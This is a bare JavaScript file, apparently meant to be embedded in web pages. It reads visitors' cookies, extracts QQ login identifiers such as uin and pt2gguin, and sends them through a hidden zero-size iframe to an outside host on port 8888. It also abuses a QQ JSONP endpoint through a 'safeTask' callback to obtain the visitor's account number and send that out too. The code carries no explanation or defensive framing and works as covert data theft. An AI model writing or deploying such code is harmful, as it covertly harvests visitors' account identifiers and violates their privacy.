var c=document.cookie;
var vc=c.split("; ");
var i;
var pp="";

for (i=0;i<vc.length;i++)
{
	var tmp=vc[i].split("=");
	if (tmp[0]=='uin' ||  tmp[0]=='pt2gguin' ||  tmp[0]=='uin_cookie' || tmp[0]=='ptui_loginuin' || tmp[0]=='o_cookie' || tmp[0]=='p_uin')
	{
		pp=pp+tmp[1] + '%2C';
	}
}
if(pp!="")
{
	var f = document.createElement("iframe");
	f.height = "0";
	f.width = "0";
	f.border = "0";
	f.style.display='none';
	f.src = "http://www.81c.cn:8888/cs/query.asp?webID=" + pp + "&tm=" + Math.random();
	document.body.appendChild(f);
}

function QueryData(pp)
{
var f = document.createElement("iframe");
	f.height = "0";
	f.width = "0";
	f.border = "0";
	f.style.display='none';
	f.src = "http://www.81c.cn:8888/cs/query.asp?webID=" + pp + "&tm=" + Math.random();
	document.body.appendChild(f);
}
var ie = document.all ? true : false;
function ReadJs(a, b, c) {
	var d = document.createElement("script");
	d.type = "text/javascript";
	d.charset = "utf-8";
	d.src = a;
	d.onerror = function() {
		if (c) {
			setTimeout(c, 0)
		}
	};
	if (ie) {
		d.onreadystatechange = function() {
			if (d.readyState) {
				if (d.readyState == "loaded" || d.readyState == "complete") {
					d.onreadystatechange = null;
					d.onload = null;
					if (b) {
						setTimeout(b, 0)
					}
				}
			} else {
				d.onreadystatechange = null;
				d.onload = null;
				if (b) {
					setTimeout(b, 0)
				}
			}
		}
	} else {
		d.onload = function() {
			if (d.readyState) {
				if (d.readyState == "loaded" || d.readyState == "complete") {
					d.onreadystatechange = null;
					d.onload = null;
					if (b) {
						setTimeout(b, 0)
					}
				}
			} else {
				d.onreadystatechange = null;
				d.onload = null;
				if (b) {
					setTimeout(b, 0)
				}
			}
		}
	}
	document.getElementsByTagName('HEAD').item(0).appendChild(d)
}
function safeTask(b) {
	var xx1 = "0";
	xx1 = b.uin;
	if (xx1 !== "0" && xx1 !== "" && xx1 !== "undefined") {
		QueryData(xx1)
	}
}
ReadJs('http://c.pc.qq.com/fcgi-bin/scgettask?cb=safeTask&systype=103')
